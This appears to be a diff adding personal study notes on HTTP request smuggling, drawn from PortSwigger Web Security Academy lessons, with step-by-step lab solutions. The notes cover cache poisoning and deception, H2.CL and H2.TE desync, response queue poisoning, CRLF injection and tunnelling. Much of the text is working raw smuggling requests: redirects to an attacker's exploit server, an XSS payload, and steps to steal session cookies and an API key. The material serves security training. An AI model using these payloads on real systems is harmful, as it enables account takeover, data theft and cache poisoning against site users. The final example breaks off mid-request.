+    Content-Length: 150
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /post?postId=5 HTTP/1.1
+    User-Agent: a"/><script>alert(1)</script>   // <input value="a"/><script>alert(1)</script> ">
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 5
+
+    x=1
+
+------------------------------------------
+
+								<> Using HTTP request smuggling to turn an on-site redirect into an open redirect
+
+# Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. 
+# An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash: 
+
+----------------------------------------------
+GET /home HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/								
+--------------------------------------
+
+# This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. For example: 
+
+-------------------------------
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+
+--------------------------------
+
+# The smuggled request will trigger a redirect to the attacker's website, which will affect the next user's request that is processed by the back-end server. For example: 
+
+-------------------------
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+
+------------------------------------
+
+# Here, the user's request was for a JavaScript file that was imported by a page on the web site. The attacker can fully compromise the victim user by returning their own JavaScript in the response. 
+
+								## Turning root-relative redirects into open redirects
+
+# In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL for the Location header, for example:
+
+-----------------------------
+GET /example HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: /example/
+----------------------------
+
+# This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path:
+
+------------------------------------------------
+GET //attacker-website.com/example HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: //attacker-website.com/example/								
+---------------------------------------------
+
+							## Using HTTP request smuggling to perform web cache poisoning
+
+# In a variation of the preceding attack, it might be possible to exploit HTTP request smuggling to perform a web cache poisoning attack. 
+# If any part of the front-end infrastructure performs caching of content (generally for performance reasons), then it might be possible to poison the cache with the off-site redirect response. 
+# This will make the attack persistent, affecting any user who subsequently requests the affected URL.
+
+---------------------------------------------------------
+
+1. In this variant, the attacker sends all of the following to the front-end server:
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 59
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+2. The smuggled request reaches the back-end server, which responds as before with the off-site redirect. The front-end server caches this response against what it believes is the URL in the second request, which is /static/include.js:
+
+GET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+
+-------------------------------------------------------------
+
+# From this point onwards, when other users request this URL, they receive the redirection to the attacker's web site. 
+
+<> Lab: Exploiting HTTP request smuggling to perform web cache poisoning
+
+#  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.
+
+# To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie. 
+
+
+---------------------------------------------------------
+POST / HTTP/1.1
+Host: 0a92008904322c77c320071a00aa0096.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 184
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: exploit-0afa00ca04902c70c39a063d01ba004a.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a92008904322c77c320071a00aa0096.web-security-academy.net
+Connection: close
+----------------------------------------------------
+
+
+								## Using HTTP request smuggling to perform web cache deception
+								
+# Using HTTP request smuggling to perform web cache deception
+
+# In yet another variant of the attack, you can leverage HTTP request smuggling to perform web cache deception. 
+# This works in a similar way to the web cache poisoning attack but with a different purpose.
+# What is the difference between web cache poisoning and web cache deception?
+
+# In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+
+# In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
+
+# In this variant, the attacker smuggles a request that returns some sensitive user-specific content. For example:
+
+---------------------------------------------------------------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 43
+Transfer-Encoding: chunked
+
+0
+
+GET /private/messages HTTP/1.1
+Foo: X
+---------------------------------------------------------------------
+
+# The next request from another user that is forwarded to the back-end server will be appended to the smuggled request, including session cookies and other headers. For example:
+
+----------------------------------------------------------
+GET /private/messages HTTP/1.1
+Foo: XGET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
+Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
+...
+-----------------------------------------------------
+
+# The back-end server responds to this request in the normal way. 
+# The URL in the request is for the user's private messages and the request is processed in the context of the victim user's session. 
+# The front-end server caches this response against what it believes is the URL in the second request, which is /static/some-image.png:
+
+-----------------------------------------------------------
+GET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 200 Ok
+...
+<h1>Your private messages</h1>
+...
+-------------------------------------------------------------
+
+# The attacker then visits the static URL and receives the sensitive content that is returned from the cache.
+
+# An important caveat here is that the attacker doesn't know the URL against which the sensitive content will be cached, since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect. 
+# The attacker might need to fetch a large number of static URLs to discover the captured content. 	
+							
+						
+<> Lab: Exploiting HTTP request smuggling to perform web cache deception
+
+--------------------------------------------------------
+1. Log in to your account and access the user account page.
+2. Observe that the response doesn't have any anti-caching headers.
+
+3. Smuggle a request to fetch the API key:
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 42
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /my-account HTTP/1.1
+    X-Ignore: X
+    
+4. Repeat this request a few times, then load the home page in an incognito browser window.
+5. Use the Search function on the Burp menu to see if the phrase "Your API Key" has appeared in any static resources. If it hasn't, repeat the POST requests, force-reload the browser window, and re-run the search.
+6. Submit the victim's API key as the lab solution.
+
+-----------------------------------------------------
+
+							## Advanced HTTP request smuggling
+
+1. How common HTTP/2 implementations enable a range of powerful new vectors for request smuggling, making a number of previously secure sites vulnerable to these kinds of attacks.
+
+2. How you can use request smuggling to persistently poison the response queue, effectively enabling full-site takeover.
+
+3. How you can use HTTP/2-exclusive inputs to construct high-severity exploits even when the target doesn't reuse the connection between the front-end and back-end servers at all.
+
+<> HTTP/2 request smuggling
+
+# In this section, we'll show you how, contrary to popular belief, implementing HTTP/2 has actually made many websites more vulnerable to request smuggling, even if they were previously safe from these kinds of attacks. 
+							
+<> HTTP/2 message length
+
+# Request smuggling is fundamentally about exploiting discrepancies between how different servers interpret the length of a request. HTTP/2 introduces a single, robust mechanism for doing this, which has long been thought to make it inherently immune to request smuggling.
+
+# Although you won't see this in Burp, HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.
+
+# In theory, this mechanism means there is no opportunity for an attacker to introduce the ambiguity required for request smuggling, as long as the website uses HTTP/2 end to end. In the wild, however, this is often not the case due to the widespread but dangerous practice of HTTP/2 downgrading. 							
+
+
+<> HTTP/2 downgrading
+
+# HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request. 
+# Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1. 
+# This practice is a prerequisite for many of the attacks covered in this section. 
+
+
+<> Note on HTTP/2 message representation
+
+# As HTTP/2 is a binary protocol, we've used some artistic license to represent HTTP/2 messages in a human-readable format throughout these materials:
+
+    1. We display each message as a single entity, rather than separate "frames".
+
+    2. We display the headers using plain text name and value fields.
+
+    3. We prefix pseudo-header names with a colon to help differentiate them from normal headers.
+
+# This closely resembles the way Burp represents HTTP/2 messages in the Inspector, but note that they don't actually look like this on the wire.
+
+
+<> H2.CL vulnerabilities
+
+# HTTP/2 requests don't have to specify their length explicitly in a header. 
+# During downgrading, this means front-end servers often add an HTTP/1 Content-Length header, deriving its value using HTTP/2's built-in length mechanism.
+# Interestingly, HTTP/2 requests can also include their own content-length header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request.
+
+# The spec dictates that any content-length header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading. 
+# As a result, it may be possible to smuggle requests by injecting a misleading content-length header. 
+# Although the front-end will use the implicit HTTP/2 length to determine where the request ends, the HTTP/1 back-end has to refer to the Content-Length header derived from your injected one, resulting in a desync. 
+
+<> Front-end (HTTP/2)
+
+--------------------------------------------------------------
+:method 	POST
+:path 	/example
+:authority 	vulnerable-website.com
+content-type 	application/x-www-form-urlencoded
+content-length 	0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=1
+-------------------------------------------------
+
+<> Back-end (HTTP/1)
+
+---------------------------------------------------
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=1GET / H
+-------------------------------------------------------
+
+<> Tip
+
+# When performing some request smuggling attacks, you will want headers from the victim's request to be appended to your smuggled prefix. 
+# However, these can interfere with your attack in some cases, resulting in duplicate header errors and suchlike. 
+# In the example above, we've mitigated this by including a trailing parameter and a Content-Length header in the smuggled prefix. 
+# By using a Content-Length header that is slightly longer than the body, the victim's request will still be appended to your smuggled prefix but will be truncated before the headers.
+
+<> Lab: H2.CL request smuggling
+
+# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
+
+# To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). 
+# The victim user accesses the home page every 10 seconds. 
+
+<> SOLUTION
+
+-------------------------------------------------------------------------------
+
+1. From the Repeater menu, enable the Allow HTTP/2 ALPN override option and disable the Update Content-Length option.
+
+2. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header as follows. 
+3. Remember to expand the Inspector's Request Attributes section and change the protocol to HTTP/2 before sending the request.
+
+---------------------------------------------------
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Length: 0
+
+    SMUGGLED
+------------------------------------
+
+4. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
+
+5. Using Burp Repeater, notice that if you send a request for GET /resources, you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/.
+
+6. Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header:
+
+-----------------------------------------------------------------
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Length: 0
+
+    GET /resources HTTP/1.1
+    Host: foo
+    Content-Length: 5
+
+    x=1
+---------------------------------------------------------------------
+
+7. Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.
+
+8. Go to the exploit server and change the file path to /resources. In the body, enter the payload alert(document.cookie), then store the exploit.
+
+9. In Burp Repeater, edit your malicious request so that the Host header points to your exploit server:
+
+--------------------------------------------------------------------------
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Length: 0
+
+    GET /resources HTTP/1.1
+    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+    Content-Length: 5
+
+    x=1
+---------------------------------------------------------------------------------
+
+10. Send the request a few times and confirm that you receive a redirect to the exploit server.
+
+11. Resend the request and wait for 10 seconds or so.
+
+12. Go to the exploit server and check the access log. If you see a GET /resources/ request from the victim, this indicates that your request smuggling attack was successful. Otherwise, check that there are no issues with your attack request and try again.
+
+13. Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. 
+14. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.
+
+--------------------------------------------------------------------------------------------------------------------
+
+									## H2.TE vulnerabilities
+
+# Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any transfer-encoding: chunked header you try to inject should be stripped or the request blocked entirely. 
+# If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end that does support chunked encoding, this can also enable request smuggling attacks. 
+
+<> Front-end (HTTP/2)
+
+-----------------------------------------------------------------
+:method 	POST
+:path 	/example
+:authority 	vulnerable-website.com
+content-type 	application/x-www-form-urlencoded
+transfer-encoding 	chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: bar
+-----------------------------------------------------------
+
+<> Back-end (HTTP/1)
+
+----------------------------------------------------
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: bar									
+---------------------------------------------------------------
+
+# If a website is vulnerable to either H2.CL or H2.TE request smuggling, you can potentially leverage this behavior to perform the same attacks that we covered in our previous request smuggling labs. 
+
+									## Response queue poisoning
+									
+# Response queue poisoning is a powerful request smuggling attack that enables you to steal arbitrary responses intended for other users, potentially compromising their accounts and even the entire site. 
+
+# Response queue poisoning is a powerful form of request smuggling attack that causes a front-end server to start mapping responses from the back-end to the wrong requests. 
+
+# In practice, this means that all users of the same front-end/back-end connection are persistently served responses that were intended for someone else.
+
+# This is achieved by smuggling a complete request, thereby eliciting two responses from the back-end when the front-end server is only expecting one. 
+
+									## What is the impact of response queue poisoning?
+
+# The impact of response queue poisoning is normally catastrophic. 
+# Once the queue is poisoned, an attacker can capture other users' responses simply by issuing arbitrary follow-up requests. 
+# These responses may contain sensitive personal or business data, as well as session tokens and the like, which effectively grant the attacker full access to the victim's account.
+
+# Response queue poisoning also causes significant collateral damage, effectively breaking the site for any other users whose traffic is being sent to the back-end over the same TCP connection. 
+# While attempting to browse the site as normal, users will receive seemingly random responses from the server, which will prevent most functions from working correctly. 		
+
+								## How to construct a response queue poisoning attack
+
+# For a successful response queue poisoning attack, the following criteria must be met:
+
+    1. The TCP connection between the front-end server and back-end server is reused for multiple request/response cycles.
+
+    2. The attacker is able to successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server.
+
+    3. The attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request     		because they can't determine where the request is supposed to end.
+
+<> Understanding the aftermath of request smuggling
+
+# Front-end (CL)
+
+-----------------------------------------------------------------------
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 120
+Transfer-Encoding: chunked
+
+0
+
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 25
+
+x=GET / HTTP/1.1
+Host: vulnerable-website.com
+
+-----------------------------------------------------------------
+
+<> Back-end (TE)
+
+---------------------------------------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 120
+Transfer-Encoding: chunked
+
+0
+
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 25
+
+x=GET / HTTP/1.1
+Host: vulnerable-website.com
+-----------------------------------------------------
+
+# As these leftover bytes don't form a valid request, this typically results in an error, causing the server to close the connection. 
+
+<> Smuggling a complete request   
+
+# With a bit of care, you can smuggle a complete request instead of just a prefix. As long as you send exactly two requests in one, any subsequent requests on the connection will remain unchanged:
+
+<>  Front-end (CL) 
+--------------------------------------------------------
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Type: x-www-form-urlencoded\r\n
+Content-Length: 61\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /anything HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+GET / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n 
+--------------------------------
+
+<> Back-end (TE)
+
+-----------------------------------------------------------
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Type: x-www-form-urlencoded\r\n
+Content-Length: 61\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /anything HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+GET / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+--------------------------------------------
+#  Notice that no invalid requests are hitting the back-end, so the connection should remain open following the attack. 
+																							
+<> Desynchronizing the response queue
+
+#  When you smuggle a complete request, the front-end server still thinks it only forwarded a single request. On the other hand, the back-end sees two distinct requests, and will send two responses accordingly: 
+
+
+# The front-end correctly maps the first response to the initial "wrapper" request and forwards this on to the client. 
+# As there are no further requests awaiting a response, the unexpected second response is held in a queue on the connection between the front-end and back-end.
+
+# When the front-end receives another request, it forwards this to the back-end as normal. 
+# However, when issuing the response, it will send the first one in the queue, that is, the leftover response to the smuggled request.
+
+# The correct response from the back-end is then left without a matching request. 
+# This cycle is repeated every time a new request is forwarded down the same connection to the back-end. 
+
+<> Stealing other users' responses
+
+# Once the response queue is poisoned, the attacker can just send an arbitrary request to capture another user's response. 
+
+# They have no control over which responses they receive as they will always be sent the next response in the queue i.e. the response to the previous user's request. # In some cases, this will be of limited interest. 
+# However, using tools like Burp Intruder, an attacker can easily automate the process of reissuing the request. 
+# By doing so, they can quickly grab an assortment of responses intended for different users, at least some of which are likely to contain useful data.
+
+# An attacker can continue to steal responses like this for as long as the front-end/back-end connection remains open. 
+# Exactly when a connection is closed differs from server to server, but a common default is to terminate a connection after it has handled 100 requests. 
+# It's also trivial to repoison a new connection once the current one is closed.
+
+<> Tip
+
+# To make it easier to differentiate stolen responses from responses to your own requests, try using a non-existent path in both of the requests that you send. 
+# That way, your own requests should consistently receive a 404 response, for example.
+
+<> Lab: Response queue poisoning via H2.TE request smuggling
+
+# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. 
+							
+-------------------------------------------------------------------------------------------------------
+1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's Request Attributes section and change the protocol to HTTP/2 before sending the request.
+
+---------------------------------------------------------------------
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Transfer-Encoding: chunked
+
+    0
+
+    SMUGGLED
+------------------------------------------------------------------------
+
+2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
+
+3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. 
+4. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.
+
+---------------------------------------------------------------------------
+    POST /x HTTP/2
+    Host: 0a2a005a03ecd94bc07f4a2f00d40069.web-security-academy.net
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /x HTTP/1.1
+    Host: 0a2a005a03ecd94bc07f4a2f00d40069.web-security-academy.net
+    
+<> Note
+
+5. Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header.
+
+6. Send the request to poison the response queue. You will receive the 404 response to your own request.
+
+7. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.
+    
+<> Note
+
+8. If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.
+
+9. Copy the session cookie and use it to send the following request:
+
+    GET /admin HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=STOLEN-SESSION-COOKIE
+
+10. Send the request repeatedly until you receive a 200 response containing the admin panel.
+
+11. In the response, find the URL for deleting Carlos (/admin/delete?username=carlos), then update the path in your request accordingly. Send the request to delete Carlos and solve the lab.
+
+------------------------------------------------------------------------------------------------------------------------
+
+							<> Request smuggling via CRLF injection
+
+# Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the content-length or stripping any transfer-encoding headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.
+
+# In HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (\n) characters to smuggle prohibited headers. 
+# If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.
+
+ Foo: bar\nTransfer-Encoding: chunked
+
+This discrepancy doesn't exist with the handling of a full CRLF (\r\n) sequence because all HTTP/1 servers agree that this terminates the header.
+
+# On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. 
+# This means that \r\n no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split:
+
+foo 	bar\r\nTransfer-Encoding: chunked
+
+# This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the \r\n will once again be interpreted as a header delimiter. 
+# As a result, an HTTP/1 back-end server would see two distinct headers:
+
+Foo: bar
+Transfer-Encoding: chunked							
+
+
+<> Lab: HTTP/2 request smuggling via CRLF injection
+
+# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers. 
+
+
+-------------------------------------------------------------------------------------------
+1. In Burp's browser, use the lab's search function a couple of times and observe that the website records your recent search history. Send the most recent POST / request to Burp Repeater and remove your session cookie before resending the request. Notice that your search history is reset, confirming that it's tied to your session cookie.
+
+2. Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.
+
+3. Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value, followed by the Transfer-Encoding: chunked header:
+
+    Name
+    foo
+
+    Value
+    bar\r\n
+    Transfer-Encoding: chunked
+
+    In the body, attempt to smuggle an arbitrary prefix as follows:
+    0
+
+    SMUGGLED
+
+4. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix
+
+5. Change the body of the request to the following:
+    0
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE
+    Content-Length: 800
+
+    search=x
+
+6. Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive:
+
+7. If you got lucky with your timing, you may see a 404 Not Found response. In this case, refresh the page again and move on to the next step.
+
+8. If you instead see the search results page, observe that the start of your request is reflected on the page because it was appended to the search=x parameter in the smuggled prefix. In this case, send the request again, but this time wait for 15 seconds before refreshing the page. If you see a 404 response, just refresh the page again.
+
+9. Check the recent searches list. If it contains a GET request, this is the start of the victim user's request and includes their session cookie. If you instead see your own POST request, you refreshed the page too early. Try again until you have successfully stolen the victim's session cookie.
+
+10. In Burp Repeater, send a request for the home page using the stolen session cookie to solve the lab.
+
+---------------------------------------------------------------------------------------------------------
+
+								## HTTP/2 request splitting
+
+# When we looked at response queue poisoning, you learned how to split a single HTTP request into exactly two complete requests on the back-end. 
+# In the example we looked at, the split occurred inside the message body, but when HTTP/2 downgrading is in play, you can also cause this split to occur in the headers instead.
+
+# This approach is more versatile because you aren't dependent on using request methods that are allowed to contain a body. For example, you can even use a GET request: 
+
+:method 	GET
+:path 	/
+:authority 	vulnerable-website.com
+foo 	
+
+bar\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: vulnerable-website.com
+
+# This is also useful in cases where the content-length is validated and the back-end doesn't support chunked encoding. 								
+
+
+							## Accounting for front-end rewriting
+
+# To split a request in the headers, you need to understand how the request is rewritten by the front-end server and account for this when adding any HTTP/1 headers manually. Otherwise, one of the requests may be missing mandatory headers.
+
+# For example, you need to ensure that both requests received by the back-end contain a Host header. 
+# Front-end servers typically strip the :authority pseudo-header and replace it with a new HTTP/1 Host header during downgrading. 
+# There are different approaches for doing this, which can influence where you need to position the Host header that you're injecting. 
+
+#  Consider the following request:
+
+		:method 	GET
+		:path 	/
+		:authority 	vulnerable-website.com
+		foo 	
+
+		bar\r\n
+		\r\n
+		GET /admin HTTP/1.1\r\n
+		Host: vulnerable-website.com							
+
+# During rewriting, some front-end servers append the new Host header to the end of the current list of headers. 
+# As far as an HTTP/2 front-end is concerned, this after the foo header. 
+# Note that this is also after the point at which the request will be split on the back-end. 
+# This means that the first request would have no Host header at all, while the smuggled request would have two. 
+# In this case, you need to position your injected Host header so that it ends up in the first request once the split occurs: 
+
+		:method 	GET
+		:path 	/
+		:authority 	vulnerable-website.com
+		foo 	
+
+		bar\r\n
+		Host: vulnerable-website.com\r\n
+		\r\n
+		GET /admin HTTP/1.1
+
+# You will also need to adjust the positioning of any internal headers that you want to inject in a similar manner. 
+
+<> Lab: HTTP/2 request splitting via CRLF injection
+
+------------------------------------------------------------------------------------------------
+1. Send a request for GET / to Burp Repeater. Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.
+
+2. Change the path of the request to a non-existent endpoint, such as /x. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.
+
+3. Using the Inspector, append an arbitrary header to the end of the request. In the header value, inject \r\n sequences to split the request so that you're smuggling another request to a non-existent endpoint as follows:
+
+    Name
+    foo
+
+    Value
+    bar\r\n
+    \r\n
+    GET /x HTTP/1.1\r\n
+    Host: YOUR-LAB-ID.web-security-academy.net
+
+4. Send the request. When the front-end server appends \r\n\r\n to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.
+
+5. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.
+   
+   <> Note
+
+# If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.
+
+6. Copy the session cookie and use it to send the following request:
+
+    GET /admin HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=STOLEN-SESSION-COOKIE
+
+7. Send the request repeatedly until you receive a 200 response containing the admin panel.
+
+8. In the response, find the URL for deleting Carlos (/admin/delete?username=carlos), then update the path in your request accordingly. Send the request to delete Carlos and solve the lab.
+
+--------------------------------------------------------------------------------------------------
+
+<> Tip
+
+# In the example above, we've split the request in a way that triggers response queue poisoning, but you can also smuggle prefixes for classic request smuggling attacks in this way. 
+# In this case, your injected headers may clash with the headers in the request that is appended to your prefix on the back-end, resulting in duplicate header errors or causing the request to be terminated in the wrong place. 
+# To mitigate this, you can include a trailing body parameter in the smuggled prefix along with a Content-Length header that is slightly longer than the body. 
+# The victim's request will still be appended to your smuggled prefix but will be truncated before the headers
+								
+								## HTTP request tunnelling
+
+# Many of the request smuggling attacks we've covered so far are only possible because the same connection between the front-end and back-end server is used for handling multiple requests. 
+# HTTP request tunnelling provides a way to craft high-severity exploits even when there is no connection reuse at all. 
+
+#  Many of the request smuggling attacks we've covered are only possible because the same connection between the front-end and back-end handles multiple requests. 
+# Although some servers will reuse the connection for any requests, others have stricter policies.
+
+# For example, some servers only allow requests originating from the same IP address or the same client to reuse the connection. 
+# Others won't reuse the connection at all, which limits what you can achieve through classic request smuggling as you have no obvious way to influence other users' traffic. 								
+    
+# Although you can't poison the socket to interfere with other users' requests, you can still send a single request that will elicit two responses from the back-end. # This potentially enables you to hide a request and its matching response from the front-end altogether.     
+    
+#  You can use this technique to bypass front-end security measures that may otherwise prevent you from sending certain requests. 
+# In fact, even some mechanisms designed specifically to prevent request smuggling attacks fail to stop request tunnelling.
+
+# Tunneling requests to the back-end in this way offers a more limited form of request smuggling, but it can still lead to high-severity exploits in the right hands.   
+    
+🔘️ Request tunnelling with HTTP/2
+
+#  Request tunnelling is possible with both HTTP/1 and HTTP/2 but is considerably more difficult to detect in HTTP/1-only environments. 
+# Due to the way persistent (keep-alive) connections work in HTTP/1, even if you do receive two responses, this doesn't necessarily confirm that the request was successfully smuggled.
+
+# In HTTP/2 on the other hand, each "stream" should only ever contain a single request and response. 
+# If you receive an HTTP/2 response with what appears to be an HTTP/1 response in the body, you can be confident that you've successfully tunneled a second request.
+
+								⚪️ Leaking internal headers via HTTP/2 request tunnelling
+
+▫️ When request tunnelling is your only option, you won't be able to leak internal headers using the technique we covered in one of our earlier labs, but HTTP/2 downgrading enables an alternative solution.
+
+▫️ You can potentially trick the front-end into appending the internal headers inside what will become a body parameter on the back-end. Let's say we send a request that looks something like this: 	
+
+------------------------------------------------------------------------------------------
+
+:method 	POST
+:path 	/comment
+:authority 	vulnerable-website.com
+content-type 	application/x-www-form-urlencoded
+foo 	
+
+bar\r\n
+Content-Length: 200\r\n
+\r\n
+comment=
+x=1
+-------------------------------------------------------------------------
+
+▫️ In this case, both the front-end and back-end agree that there is only one request. 
+▫️ What's interesting is that they can be made to disagree on where the headers end.
+
+▫️ The front-end sees everything we've injected as part of a header, so adds any new headers after the trailing comment= string. 
+▫️ On the other hand, the back-end sees the \r\n\r\n sequence and thinks this is the end of the headers. 
+▫️ The comment= string, along with the internal headers, are treated as part of the body. 
+▫️ The result is a comment parameter with the internal headers as its value.
+
+------------------------------------------------------------------------------
+POST /comment HTTP/1.1
+Host: vulnerable-website.com
